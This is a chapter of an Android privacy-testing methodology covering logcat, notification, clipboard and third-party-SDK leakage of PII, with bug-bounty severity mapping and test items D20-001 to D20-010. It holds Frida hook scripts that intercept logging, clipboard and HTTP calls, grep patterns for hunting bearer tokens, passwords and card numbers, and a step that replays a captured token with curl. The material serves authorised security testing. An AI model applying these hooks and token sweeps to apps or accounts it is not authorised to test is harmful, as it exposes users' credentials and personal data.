# D20 · Privacy, PII, Logging & Data Leakage

> Everything the app says about the user to a party that is not the app: logcat, notifications, the
> clipboard, the screen, the IME, the accessibility tree, the autofill structure, the crash reporter, the
> analytics SDK, the photo's EXIF block and the wire itself. Stated bluntly: **almost every native
> mechanism in this chapter is capped at P5 by the Bugcrowd VRT** — `insecure_data_storage.screen_caching_enabled`,
> `mobile_security_misconfiguration.clipboard_enabled`, `external_behavior.browser_feature.autocomplete_enabled`
> and `external_behavior.user_password_persisted_in_memory` are all P5 outright, and Google's own Mobile VRP
> excludes logcat by name. The chapter pays in exactly three places: when the leaked value is an
> **authenticator** (then it is D13's finding, not this chapter's), when the disclosure is **cross-user**
> (then HackerOne's PII standard reaches Critical), and when the recipient is a **third party the user was
> never told about** (then it is a data-flow finding with a named recipient, not a compliance opinion).

| | |
|---|---|
| **Phases** | P4 static + traffic-capture privacy sweep; P5 on-device capture, lifecycle and residue |
| **Milestones** | M4 (the logout / deletion / residue items land in M5) |
| **VRT ceiling** | Natively, **P3** — `sensitive_data_exposure.exif_geolocation_data_not_stripped_from_uploaded_images.automatic_user_enumeration` is the only concrete rated node this domain owns above P4 (`...manual_user_enumeration` is P4; `privacy_concerns.unnecessary_data_collection.wifi_ssid_password` is the only concrete `privacy_concerns` child, at P4). The honest ceiling is reached by **leaving the branch**: `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` carries a **null** priority — "varies by demonstrated impact" — and HackerOne's Platform Standards put multi-user sensitive-PII exposure by an unprivileged internet attacker at **Critical**; a logged or notification-borne OTP files as `broken_authentication_and_session_management.two_fa_bypass` (**P3**); a logged bearer token that authenticates files as `broken_authentication_and_session_management.authentication_bypass` (**P1**); a server-side send credential recovered alongside the telemetry files as `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (**P1**). Never file a privacy observation under a P5 node when the value is an authenticator — file the authenticator. |
| **Primary attacker model** | **AM-04** — a co-resident app holding exactly one user-granted capability: notification access, an accessibility service, being the default IME, or a MediaProjection consent. This is the model that makes the chapter real, and it is one toggle, not an exploit. Also **AM-08** malicious or over-collecting third-party SDK (the crash/analytics/session-replay items), **AM-10** physical locked (lock-screen notifications), **AM-05** another user of the same app (EXIF, shared devices), **AM-03** zero-permission local app (shared-storage and broadcast leakage). **AM-12 own rooted device is not an attack** and is the single most common reason a D20 report closes informational. |
| **Maps to** | MASVS-PRIVACY-1, MASVS-PRIVACY-2, MASVS-PRIVACY-3, MASVS-PLATFORM-3, MASVS-STORAGE-1, MASVS-STORAGE-2 · MASTG-TEST-0203, MASTG-TEST-0206, MASTG-TEST-0231, MASTG-TEST-0254, MASTG-TEST-0255, MASTG-TEST-0256, MASTG-TEST-0257, MASTG-TEST-0258, MASTG-TEST-0263, MASTG-TEST-0264, MASTG-TEST-0265, MASTG-TEST-0289, MASTG-TEST-0291, MASTG-TEST-0292, MASTG-TEST-0293, MASTG-TEST-0294, MASTG-TEST-0315, MASTG-TEST-0316, MASTG-TEST-0318, MASTG-TEST-0319, MASTG-TEST-0320; deprecated v1 predecessors MASTG-TEST-0003, MASTG-TEST-0005, MASTG-TEST-0006, MASTG-TEST-0008, MASTG-TEST-0010, MASTG-TEST-0041 · MASTG-TECH-0002, MASTG-TECH-0009, MASTG-TECH-0010, MASTG-TECH-0022, MASTG-TECH-0043, MASTG-TECH-0100, MASTG-TECH-0142 · MASTG-KNOW-0009, MASTG-KNOW-0049, MASTG-KNOW-0053, MASTG-KNOW-0054, MASTG-KNOW-0055 · MASTG-BEST-0002, MASTG-BEST-0014, MASTG-BEST-0019, MASTG-BEST-0027 · MASTG-TOOL-0001, MASTG-TOOL-0015, MASTG-TOOL-0029, MASTG-TOOL-0077, MASTG-TOOL-0079, MASTG-TOOL-0081, MASTG-TOOL-0097, MASTG-TOOL-0106, MASTG-TOOL-0112 · MASWE-0005, MASWE-0019, MASWE-0025, MASWE-0030, MASWE-0036, MASWE-0037, MASWE-0038, MASWE-0040, MASWE-0050, MASWE-0061, MASWE-0067, MASWE-0068, MASWE-0073, MASWE-0074 · CWE-200, CWE-256, CWE-312, CWE-359, CWE-459, CWE-524, CWE-532, CWE-668, CWE-732, CWE-921, CWE-927 · T1414, T1417.001, T1429, T1430, T1453, T1512, T1513, T1517, T1532, T1533, T1541, T1628, T1628.002, T1636 (.001–.005), T1641.001, T1644, T1646 · AOSP security-model threats [T.A5], [T.D1], [T.P3], [T.P4] |

## Why this domain pays

Mostly it does not, and the base rates from the corpus say so with unusual clarity. Google's Mobile VRP
Invalid Reports page excludes logging outright: *"We aim to keep Android logs free of personally
identifiable information, but since debugging privileges are required to access logs, an app logging
sensitive data is not considered a severe enough vulnerability to qualify."* Superhuman/Grammarly's
"Grammarly Keyboard for Android <4.1 leaks user input through logs" paid **$0** on 84 upvotes (H1 #462416).
NordVPN's advertising-identifier misuse (H1 #803941) paid **$0**. Basecamp lists "EXIF information not
stripped from uploaded images" as out of scope. Xiaomi excludes "any data leak because the malicious APP has
acquired the appropriate permissions". Intigriti's triage standard rejects *"functional bugs or process flaws
resulting in compliance, privacy and governance issues that do not pose an immediate and exploitable
threat"*. If your D20 output is a list of things the app logs, you have produced hygiene notes.

Three exceptions carry the chapter. **First, the value class.** A logged, notified, clipboard-borne or
accessibility-readable **OTP** is a second-factor bypass (VRT `two_fa_bypass`, P3); a logged **bearer token
that still authenticates** is an authentication bypass (P1). The mechanism is P5 and the value is P1 — file
the value. Mail.ru's "read new emails from any inbox in notification center" paid **$10,000**, the largest
single payout in the TOPMOBILE dataset the corpus reviewed, and it is a notification-surface finding.
**Second, the recipient.** A live session token, a full PAN, an OTP or a health datum arriving at a
third-party crash, analytics or session-replay host is a cross-boundary disclosure with a named recipient —
that is a captured payload, not a compliance argument, and programmes pay for it. The inversion that makes
this section productive: **`FLAG_SECURE` does not stop an in-process capture**, so a crash reporter's
view-hierarchy attachment or a session-replay SDK's frame grab defeats the app's own screenshot control
from inside. **Third, the cross-user direction.** HackerOne's Platform Standards: where the vulnerability
*"enables an unprivileged attacker to directly access sensitive Personally Identifiable Information (PII)
for multiple users, and the exploit that could be applied to a substantial portion of the user base via the
internet, the severity rating should be considered Critical"*, with an enumerated list — SSN, passport
number, driver's licence, hashed passwords, card numbers, VIN, physical address, date of birth. The same
standard adds: *"As soon as a vulnerability exposing sensitive PII is found, testing must stop and the issue
should be reported."* EXIF is the archetype of the cross-user variant: your own photo's GPS is worthless,
another user's photo's GPS fetched from the CDN is a home address.

The discipline that makes the rest of the chapter defensible is that every privacy observation is half a
finding. The other half is a **named reader**: a package that holds `READ_LOGS`, an enabled
`NotificationListenerService`, the default IME, an accessibility service, a MediaProjection consumer, a
signed-in second account, or a third-party host in your proxy log. Write that sentence first and the rating
follows mechanically: a third party that already received the data is High; a one-toggle co-resident app is
Medium; only root or ADB reaches it, and it is Low or informational.

## The crux question

**For each sensitive value the app handles: which principal other than the app and its own backend ends up
holding that value — a co-resident app with one user grant, a third-party host, the lock screen, another
signed-in user — and if none does, is any value the app emits an authenticator?**

## Triage order

1. **Build the canary identity and the marker set first** (D20-002). Every later capture is greppable only
   if the values you typed are unique 8+ character markers. Skipping this makes the whole day's traffic
   capture unsearchable and produces word-collision false positives.
2. **One controlled flow, all log buffers, then grep** (D20-007). Ten minutes, and it decides whether the
   logging half of the chapter is live or a verified negative.
3. **Enumerate `READ_LOGS` holders on the target's supported device set** (D20-008). One loop. Without a
   named holder, every logcat item below is P5 and you should say so in the report rather than inflate it.
4. **Proxy one authenticated session and grep the capture for the canaries** (D20-025). This is the item
   with the highest realistic ceiling and it reuses the capture you already have from D14/D15.
5. **Attribute every host to its owning SDK with one Frida stack-trace hook** (D20-019). It converts
   "the app talks to eleven hosts" into "this SDK sent this user's email", which is the difference between
   an inventory and a finding.
6. **`dumpsys notification --noredact` while the OTP / transaction / message notification is live**
   (D20-030, D20-031). Cheap, and it is the surface with the single largest disclosed payout in the corpus.
7. **The consent-off differential** (D20-020). Run the same flow with every toggle off and diff the
   capture. Identical traffic is a demonstrable control failure, not an opinion.
8. **Crash on the most sensitive screen with the proxy up** (D20-016, D20-017). The one test that defeats
   the app's own `FLAG_SECURE` policy from inside the process.
9. **Session-replay SDK inventory and a typed test PAN** (D20-018). If the app embeds UXCam / Smartlook /
   Clarity / FullStory / Quantum Metric, this is the highest-severity item in the chapter for a payments app.
10. **EXIF: upload from account A, fetch as account B** (D20-058). Two commands, and it is the only native
    node in this chapter rated above P4.
11. **Identifier sweep, then check where the identifier goes** (D20-052 to D20-057). Fast, usually Medium,
    and occasionally it turns out the identifier *is* the auth factor, which is a different chapter.
12. **Logout, then account deletion, against a throwaway account** (D20-060 to D20-063). Slow, irreversible,
    and it is where "privacy" becomes "the token still works".
13. **Clipboard, keyboard cache, autofill, Recents** (D20-040, D20-043 to D20-049). All P5 by VRT. Run them
    for completeness, for the chain, and for the ruled-out register — never as headline findings.

## Items

### D20-001 · The reader test — name the principal who holds the value before writing the word "leak"

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null = rated on demonstrated impact) — this item exists to get you **into** that node instead of the P5 mechanism nodes |
| **Attacker** | AM-04 / AM-08 / AM-10 / AM-05; explicitly **not** AM-12 |
| **Applies to** | all — this is the gate for every other item in the chapter |
| **Maps to** | HackerOne Platform Standards (multi-user sensitive PII → Critical; enumerated list: SSN, passport number, driver's licence number, hashed passwords, card numbers, owned-property information such as a VIN, physical address, date of birth); NIST SP 800-122 §3; AOSP security-model threat [T.A5] "Reading content from system or other app user interfaces"; CWE-200, CWE-359 |

- **Test:** Before writing anything, answer in one sentence: *which principal other than this app ends up
  holding this value, and what did they have to do to get it?* There are exactly six answers worth writing
  down — a package holding `READ_LOGS`, an enabled `NotificationListenerService`, the default IME, an
  enabled `AccessibilityService`, a third-party host already in your proxy log, or a second signed-in
  account. Anything else is a hygiene note.
- **How:**
```bash
PKG=com.target.app
# 1. who holds READ_LOGS on this device image?
for p in $(adb shell pm list packages | sed 's/package://' | tr -d '\r'); do
  adb shell dumpsys package "$p" 2>/dev/null | grep -q 'android.permission.READ_LOGS' && echo "READ_LOGS $p"
done | tee /tmp/readlogs.txt; wc -l < /tmp/readlogs.txt
# 2. which listeners / accessibility services / IMEs are enabled right now?
adb shell settings get secure enabled_notification_listeners
adb shell settings get secure enabled_accessibility_services
adb shell settings get secure default_input_method
# 3. which third-party hosts already received something? (from the D14 capture)
mitmdump -nr flows.mitm -s /dev/stdin <<'PY'
def request(f):
    print(f.request.pretty_host)
PY
```
- **Proof:** A named principal — a package name from step 1 or 2, or a hostname from step 3 — paired with the
  value it holds. Without one, write the observation into the ruled-out register at P5 and move on.
- **Escalation:** If the named principal is a third-party host, the finding is data disclosure to an
  unauthorised party with a captured payload -> D18. If the value is an authenticator, stop writing a privacy
  report and write the auth report -> D13.
- **Ruled out when:** No package on the target's supported device set holds `READ_LOGS`; no listener,
  accessibility service or third-party IME is enabled by default; every outbound host is first-party and
  named in the privacy policy; and a second account cannot retrieve the first account's artefacts. Record
  the `READ_LOGS` loop's **count** (`wc -l`) — an empty result you can point at is the defensible negative.

### D20-002 · Build the canary identity and the marker set before you capture anything

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — method |
| **Attacker** | n/a |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0206 prerequisite `identify-sensitive-data`; MASTG-TECH-0100 (Logging Sensitive Data from Network Traffic); Marker Discipline (8+ character random markers; search the BASELINE for the marker before claiming a hit) |

- **Test:** Every leak claim in this chapter is "value X reached place Y". That is only greppable if X is
  unique. Register the test account with markers that cannot occur naturally, and **grep the baseline
  capture for each marker before you type it anywhere** — this single check kills the largest class of
  false positives in privacy testing, where a "leaked" string turns out to be a common word, a library
  constant, or your own tooling's user-agent.
- **How:**
```bash
# 1. generate markers: 8+ chars, alphanumeric, no English words, no protocol keywords
python3 - <<'PY'
import secrets, string
a = string.ascii_lowercase + string.digits
for k in ("first","last","email_local","phone_tail","street","dob_note","note","card_holder"):
    print(f"{k}\tz{''.join(secrets.choice(a) for _ in range(9))}")
PY
# example set: first=zq4h7m2kx9  email=zq4h7m2kx9@example.invalid  phone=+15550137742
#              street="zq4h7m2kx9 Lane"   note=zk8v3p1nd6
# 2. BASELINE FIRST — capture a session with none of the markers typed, then prove absence
mitmdump -w baseline.mitm     # drive the app WITHOUT entering any marker
for m in zq4h7m2kx9 zk8v3p1nd6; do
  echo -n "$m in baseline: "; mitmdump -nr baseline.mitm --set flow_detail=3 2>/dev/null | grep -c "$m"
done          # every line must print 0
# 3. now register/enter the markers and capture the real session
mitmdump -w run.mitm
```
- **Proof:** Two numbers per marker: `0` occurrences in the baseline, `N > 0` in the run capture, with the
  host and path of each occurrence. A marker that appears in the baseline is not a leak, it is a collision —
  regenerate it.
- **Escalation:** The same marker set drives D20-025 (undeclared PII), D20-016 (crash payloads), D20-007
  (logcat) and D20-058 (EXIF) without re-running anything.
- **Ruled out when:** n/a — this is the precondition, not a finding. Its failure mode is a retraction:
  a reported "PII leak" that turns out to be the string `test` appearing in an SDK constant.

### D20-003 · The crown-jewel sink map — follow the value, not the API

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — method |
| **Attacker** | n/a |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0318 / MASTG-TEST-0319 (References to / Runtime Use of SDK APIs Known to Handle Sensitive User Data) for the sink half; local corpus `references/20` Part B item 3 |

- **Test:** Catalogues are organised by *mechanism* (logs, clipboard, notifications). Attackers care about
  *the value*. Pick the app's crown jewels — session token, PAN/CVV, OTP, recovery phrase, KYC image,
  address book, precise location, health datum — and for each one enumerate **every** sink it reaches:
  memory, disk, logs, backup, IPC, notification, clipboard, screen, accessibility tree, autofill structure,
  network. The gaps between the mechanism-organised chapter and the value's actual path are where the novel
  findings live.
- **How:**
```bash
# 1. find the value's identity across every layer
VAL=access_token
grep -rn "$VAL" out/sources/ | head -40                        # Java/Kotlin
strings -n 6 out/resources/resources.arsc | grep -i "$VAL"     # string table
for so in out/lib/*/*.so; do strings -n 6 "$so" | grep -i "$VAL" && echo "  ^ $so"; done
# 2. enumerate its sinks at runtime in one pass
frida -U -f $PKG -l sinkmap.js --no-pause
```
```javascript
// sinkmap.js — one hook per sink class, all printing the same marker
Java.perform(function () {
  var MARK = /zq4h7m2kx9|eyJ[A-Za-z0-9_-]{10,}/;
  function hit(sink, s) { if (s && MARK.test(s)) console.log('[SINK ' + sink + '] ' + s.substring(0, 200)); }
  var Log = Java.use('android.util.Log');
  ['v','d','i','w','e'].forEach(function (l) {
    Log[l].overload('java.lang.String', 'java.lang.String').implementation = function (t, m) {
      hit('log', m); return this[l](t, m); }; });
  var CM = Java.use('android.content.ClipboardManager');
  CM.setPrimaryClip.implementation = function (c) { hit('clipboard', c.toString()); return this.setPrimaryClip(c); };
  var NB = Java.use('android.app.Notification$Builder');
  NB.setContentText.implementation = function (s) { hit('notification', s ? s.toString() : ''); return this.setContentText(s); };
  var SPE = Java.use('android.app.SharedPreferencesImpl$EditorImpl');
  SPE.putString.implementation = function (k, v) { hit('prefs:' + k, v); return this.putString(k, v); };
  var B = Java.use('okhttp3.Request$Builder');
  B.url.overload('java.lang.String').implementation = function (u) { hit('http', u); return this.url(u); };
});
```
- **Proof:** A per-value table — `value | sink | reachable by | evidence file` — with at least one row whose
  "reachable by" column names a principal from D20-001.
- **Escalation:** Each row is a candidate item elsewhere in this chapter; the map is what stops you finding
  the token in `shared_prefs` and never noticing it is also in the notification payload.
- **Ruled out when:** n/a — method. Its output is the input to the ruled-out register: a value with every
  sink enumerated and none reachable is a defensible negative you can name.

### D20-004 · Count your sweep results — the shell-loop ban applied to log and traffic sweeps

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — method |
| **Attacker** | n/a |
| **Applies to** | all |
| **Maps to** | Shell-Loop Ban (shell array loops fail silently — always count your results); Statistical-Sample Rule (n ≥ 10 interleaved trials before claiming a timing or rate property) |

- **Test:** A privacy sweep that returns nothing is indistinguishable from a privacy sweep that silently
  failed. `adb logcat` with a wrong `--pid`, a `grep -E` with an unescaped brace, a `mitmdump` script that
  threw on the first flow, a shell `for` loop over an array that was never populated — all print nothing and
  all look like a clean bill of health. Every sweep in this chapter must emit a count, and the count must be
  non-zero for the control.
- **How:**
```bash
# BAD: silent failure looks identical to a clean result
adb logcat -d | grep -iE 'token|password'            # prints nothing — buffer empty? grep wrong? app not run?

# GOOD: prove the pipeline works before trusting its silence
adb logcat -c
adb logcat -b all -v threadtime -d > run.log
echo "lines captured: $(wc -l < run.log)"            # MUST be large; 0 means the capture failed
echo "control marker:  $(grep -c 'zq4h7m2kx9' run.log)"   # a marker you KNOW was typed — MUST be >0 somewhere
echo "secret hits:     $(grep -icE 'bearer |eyJ[A-Za-z0-9_-]{10,}|"password"' run.log)"
# iterate anything longer than five items in Python, not shell
python3 - <<'PY'
import re, subprocess
pkgs = subprocess.run(['adb','shell','pm','list','packages'],capture_output=True,text=True).stdout.split()
pkgs = [p.replace('package:','').strip() for p in pkgs if p.startswith('package:')]
print('packages enumerated:', len(pkgs))     # a count, every time
PY
```
- **Proof:** Three numbers in the notes for every sweep: lines captured, control-marker hits, secret hits.
  A zero in the first two invalidates the third.
- **Escalation:** The same rule governs the "no leak found" negatives you will write in the ruled-out
  register — a negative without a line count is not a negative.
- **Ruled out when:** n/a — method.

### D20-005 · Tester-side data minimisation — your evidence bundle is a breach surface

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — method, with a real consequence |
| **Attacker** | n/a |
| **Applies to** | every engagement against a live backend or production data |
| **Maps to** | NIST SP 800-115 Appendix B §5.3 (Data Handling — gathering, storing, transmitting and destroying test data); §6.6 (privacy concerns for captured data that does not belong to the organisation) |

- **Test:** The redaction rules in D20-006 govern the *rendered* evidence. They do not govern what your
  tooling hoovers up in the first place: a mitmproxy flat file holding thousands of production responses, a
  full `logcat` of a live app, a `content query` dump of a provider full of real records. Those files carry
  the same NDA and privacy duties as the client's own systems — and shipping an evidence bundle containing a
  live production token is a breach you introduced while being paid to prevent them.
- **How:**
```bash
# proxy: bound the scope and strip credentials at WRITE time, not at report time
mitmdump --set stream_large_bodies=1m \
  --allow-hosts '^(api|auth)\.target\.example$' \
  -s scripts/strip.py -w evidence/flows.mitm
cat > scripts/strip.py <<'PY'
import re
SENS = re.compile(rb'(?i)(authorization|cookie|set-cookie|x-api-key|otp|password|pan|cvv)')
def response(flow):
    for h in list(flow.request.headers):
        if SENS.search(h.encode()): flow.request.headers[h] = "<redacted-at-capture>"
    for h in list(flow.response.headers):
        if SENS.search(h.encode()): flow.response.headers[h] = "<redacted-at-capture>"
PY
# logcat: bound to the target's pid and to the window you need
adb shell pidof -s $PKG | xargs -I{} adb logcat --pid={} -d > evidence/F-007/logcat.txt
# QA GATE before the bundle is encrypted — run this and paste the output into the notes
grep -rEl '(?i)authorization: bearer|set-cookie:|[0-9]{13,16}' engagement/evidence | tee /tmp/leaks.txt
wc -l < /tmp/leaks.txt
```
- **Proof:** The QA-gate grep returns only the deliberate instances — the one file per finding where the
  unredacted value *is* the finding. Rotate or invalidate that value immediately after delivery.
- **Escalation:** Run the gate as a hard step before the bundle is encrypted, alongside the D20-006
  redaction pass.
- **Ruled out when:** n/a — method.

### D20-006 · Redact victim PII in the PoC while keeping the proof intact

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — method; it is what makes a `pii_leakage_exposure` report land instead of being quarantined |
| **Attacker** | n/a |
| **Applies to** | every cross-account or PII finding |
| **Maps to** | Evidence-hygiene §3 (the mask / leave-visible split); §§2, 4, 5, 6, 8 (cookie-redaction protocol) |

- **Test:** The evidence must convince a triager and distribute nothing further. The useful part is the
  split, and testers get it backwards — they black out the JSON key names (which prove the schema) and leave
  the victim's email visible (which is the thing not to distribute).
- **How:** **Mask:** another user's first/last name, email local part, phone (last 7 digits), address below
  city level, date-of-birth year, government identifiers, face images, and correlatable account IDs.
  **Leave visible:** the JSON key names, the field shape, **your own attacker-session UID/email** (this is
  what proves the boundary crossing), the endpoint URL and method, the trace ID, and analytics/bot-management
  cookies (`__cf_bm`, `_cfuvid`, `_ga`, `x-request-id`, `x-datadog-trace-id` — these help the triager
  correlate to their logs).
```json
{"data":{"contact":{"first_name":"Nadene","email":"nadene.afton@example.com","phone":"+1-555-867-5309"}}}
{"data":{"contact":{"first_name":"<REDACTED — real first name>","email":"<REDACTED>@example.com","phone":"<REDACTED>"}}}
```
  For HAR and terminal transcripts, redact mechanically and then verify:
```bash
jq '.log.entries |= map(
  (.request.headers  |= map(if .name|ascii_downcase|IN("cookie","authorization","x-csrf-token") then .value="<REDACTED>" else . end)) |
  (.response.headers |= map(if .name|ascii_downcase|IN("set-cookie") then .value="<REDACTED>" else . end)) |
  (.request.cookies  |= map(.value="<REDACTED>")) |
  (.response.cookies |= map(.value="<REDACTED>")))' in.har > out.sanitized.har
grep -ic 'authorization\|"cookie"\|set-cookie' out.sanitized.har
```
  Then state it in the report body: *"Real PII fields in the response are masked to limit unauthorised
  exposure of victim data, per responsible-disclosure hygiene. The unredacted response is available
  privately on request."* Deliver the unredacted original through the platform's private attachment
  system — **never email**.
- **Proof:** A PoC that proves the boundary crossing without redistributing the victim's data, plus the
  verification grep returning only your own deliberate values.
- **Escalation:** Pair with D20-005 (redact at capture time) and with the five-shot pattern in D20-069.
- **Ruled out when:** n/a — method.

### D20-007 · The controlled one-flow logcat sweep — never read the buffer passively

| | |
|---|---|
| **Severity ceiling** | Low standalone (High only via the value, see D20-008) |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) — the mechanism alone has no node above P5 |
| **Attacker** | AM-04 (a `READ_LOGS` holder), AM-08 (a log-forwarding SDK), AM-11 (ADB on an unlocked device) |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0203 (Runtime Use of Logging APIs), MASTG-TEST-0231 (References to Logging APIs), MASTG-TECH-0009 (Monitoring System Logs), MASTG-TOOL-0112 (pidcat), MASTG-KNOW-0049, MASTG-BEST-0002, MASWE-0005, CWE-532; deprecated predecessor MASTG-TEST-0003 |

- **Test:** Clear the buffers, capture **all** of them, drive exactly **one** flow, then sweep. Passive
  reading produces noise you cannot attribute and misses the flow-specific leak — a token appears for two
  seconds during refresh and never again.
- **How:**
```bash
PKG=com.target.app
adb logcat -c                                   # clear FIRST
adb logcat -b all -v threadtime > run.log &     # -b all: apps and SDKs use different buffers
#   ... perform exactly ONE flow: login / payment / token refresh / deep-link open / password reset ...
kill %1
echo "lines: $(wc -l < run.log)"
grep -nEi 'authorization|bearer |eyJ[A-Za-z0-9_-]{10,}|password|passwd|refresh_token|otp|secret|sessionid|set-cookie|api[_-]?key|cvv|\b[0-9]{13,19}\b|ssn|iban' run.log
# scoped variants
adb logcat --pid=$(adb shell pidof -s $PKG)
adb logcat -b radio -v time -d                  # telephony / SMS paths
adb logcat -b crash -d -v threadtime
adb logcat *:E
pidcat $PKG                                     # MASTG-TOOL-0112
# static side: the mobsfscan rule deliberately ignores literal-only logging and matches concatenation
grep -rnE 'Log\.[vdiwef]\(|System\.(out|err)\.print|Timber\.|printStackTrace' out/sources/ | grep -E '\+|String\.format|%s'
```
- **Proof:** The matched line with its tag and timestamp, tied to the single flow you drove, and — where the
  value is a token — a `curl` using that exact value returning the account's data.
- **Escalation:** -> D20-008 for the rating, -> D20-016 if a crash SDK forwards the same buffer off-device,
  -> D13 if the value is an authenticator.
- **Ruled out when:** A controlled sweep across every flow (login, payment, profile edit, password reset,
  token refresh, deep-link open) yields a non-zero line count and **zero** hits on the regex above. Record
  the line count — the local corpus's own worked negative reads *"no credential leakage to logcat — 149k
  lines, controlled sweep"*, and that sentence is what a defensible negative looks like.

### D20-008 · Cap logcat severity honestly — enumerate the readers or rate it P5

| | |
|---|---|
| **Severity ceiling** | Low (Medium–High only with a named reader) |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null); with a *demonstrated* off-device recipient it becomes a third-party disclosure, and with an authenticator `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-04 / AM-08 / AM-11 |
| **Applies to** | **CURRENT** on every modern target |
| **Maps to** | Google Mobile VRP Invalid Reports, "Logging sensitive data" — *"since debugging privileges are required to access logs, an app logging sensitive data is not considered a severe enough vulnerability to qualify"*; HackenProof: "Debug Logs / Stack Traces — unless they expose sensitive data like credentials or tokens"; H1 #462416 (Grammarly, Low, $0); H1 #5314 (Coinbase, OAuth code in logcat, payable only once chained with the hardcoded client secret); AOSP threats [T.P3]/[T.P4] |

- **Test:** `READ_LOGS` has been `signature|privileged` since **Android 4.1 (API 16)**, so a third-party app
  cannot read another app's logcat; from **API 30** a log-access request additionally raises a user-consent
  dialog. The realistic readers are therefore exactly four: a pre-installed or OEM package that holds
  `READ_LOGS`, a debuggable build (`run-as` / any local process you can influence), an ADB/bug-report capture
  on the target's supported device set, and an in-process SDK that ships the buffer off-device. Name one, or
  rate it P5 and say why in the report.
- **How:**
```bash
# 1. enumerate READ_LOGS holders on the exact device image in scope — count the result
python3 - <<'PY'
import subprocess
out = subprocess.run(['adb','shell','pm','list','packages'],capture_output=True,text=True).stdout
pkgs = [l.replace('package:','').strip() for l in out.splitlines() if l.startswith('package:')]
hold = []
for p in pkgs:
    d = subprocess.run(['adb','shell','dumpsys','package',p],capture_output=True,text=True).stdout
    if 'android.permission.READ_LOGS' in d: hold.append(p)
print('packages:', len(pkgs), 'READ_LOGS holders:', len(hold))
for h in hold: print(' ', h)
PY
# 2. is the build debuggable? (that changes the answer entirely — see D02)
adb shell run-as $PKG id
# 3. does an in-process SDK forward logs?
grep -rnE 'Crashlytics|FirebaseCrashlytics|Sentry\.|Bugsnag|Instabug|Datadog|setCustomKey|addBreadcrumb|leaveBreadcrumb|attachLogs|recordException' out/sources/
# 4. the bug-report path
adb bugreport /tmp/br.zip && unzip -l /tmp/br.zip | grep -iE 'bugreport.*txt|FS/data/tombstones'
```
- **Proof:** Either the package name of a `READ_LOGS` holder shipped on the target's supported devices, or a
  captured upload to a telemetry host containing the same line. Without one of these, the report states
  "reachable only via ADB" and asks for P5 — which is honest and costs nothing.
- **Escalation:** A named holder → Medium. Off-device shipping → Medium–High and it becomes D20-016.
  An authenticator in the line → D13, and the rating comes from the token, not the log.
- **Ruled out when:** The enumeration returns zero third-party `READ_LOGS` holders, `run-as` fails on the
  release build, and no crash/analytics SDK is configured to attach logs. Keep the enumeration output —
  "0 of 214 packages hold READ_LOGS on the in-scope image" is a negative a triager can check.

### D20-009 · Hook the logging APIs, not just the buffer — wrappers, Timber, println, stack traces

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) |
| **Attacker** | n/a — instrumentation |
| **Applies to** | all; essential where R8 has renamed the logging wrapper |
| **Maps to** | MASTG-TEST-0203 (Runtime Use of Logging APIs); MASTG-TOOL-0001 (Frida); MASWE-0005 |

- **Test:** Apps route logging through their own wrapper (`AppLog`, `Timber`, a Kotlin `inline fun log`),
  through `System.out`, or through `Throwable.printStackTrace()`. A release build may strip
  `android.util.Log` with `-assumenosideeffects` and still emit everything through `println`. Hooking the
  sinks gives you the **call site**, which is what makes the report actionable — and it catches values that
  never reach the buffer because the wrapper is a no-op in release but still formats the string in memory.
- **How:**
```bash
frida -U -f $PKG -l loghooks.js --no-pause
```
```javascript
Java.perform(function () {
  var Log = Java.use('android.util.Log');
  var Ex  = Java.use('java.lang.Exception');
  function bt() { return Log.getStackTraceString(Ex.$new()); }
  ['v','d','i','w','e'].forEach(function (l) {
    Log[l].overload('java.lang.String','java.lang.String').implementation = function (t, m) {
      console.log('[Log.' + l + '] ' + t + ': ' + m + '\n' + bt()); return this[l](t, m); };
  });
  var PS = Java.use('java.io.PrintStream');
  PS.println.overload('java.lang.String').implementation = function (s) {
    console.log('[println] ' + s + '\n' + bt()); return this.println(s); };
  var T = Java.use('java.lang.Throwable');
  T.printStackTrace.overload().implementation = function () {
    console.log('[printStackTrace] ' + this.getMessage() + '\n' + bt()); return this.printStackTrace(); };
  var JL = Java.use('java.util.logging.Logger');
  JL.log.overload('java.util.logging.Level','java.lang.String').implementation = function (lv, m) {
    console.log('[jul] ' + m); return this.log(lv, m); };
});
```
- **Proof:** A hook line carrying the sensitive value **plus** the backtrace naming the emitting class and
  method — that is the remediation line the developer needs.
- **Escalation:** The backtrace usually identifies an SDK rather than app code -> D18. It also finds the
  `HttpLoggingInterceptor` from D20-010 without grepping for it.
- **Ruled out when:** The hooks fire (prove it with a benign line, so you know the overloads matched) and no
  invocation carries a value from the marker set or the secret regex across a full functional pass.

### D20-010 · `HttpLoggingInterceptor` / Chucker / Stetho left at BODY in a release build

| | |
|---|---|
| **Severity ceiling** | High (when a live session token or credential is in the dumped body) |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null); with a working token, `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-04 / AM-08 / AM-11 |
| **Applies to** | all OkHttp/Retrofit apps; check the **release** flavour specifically |
| **Maps to** | H1 **#56002** (Shopify, "Shopify android client all API request's response leakage, including access_token, cookie, response header, response body content"); CVE-2014-1664 / EDB 39061 (GoToMeeting for Android — `D/G2M` lines containing the full `getInfo` URL and a body with `"authToken":"AAFe4rYexu4..."` and `"accessCode"`); CWE-532; MASWE-0005 |

- **Test:** The single most common form of "insecure logging" that actually matters. A debug network
  interceptor dumps the whole request and response — headers included — to logcat or to an in-app inspector.
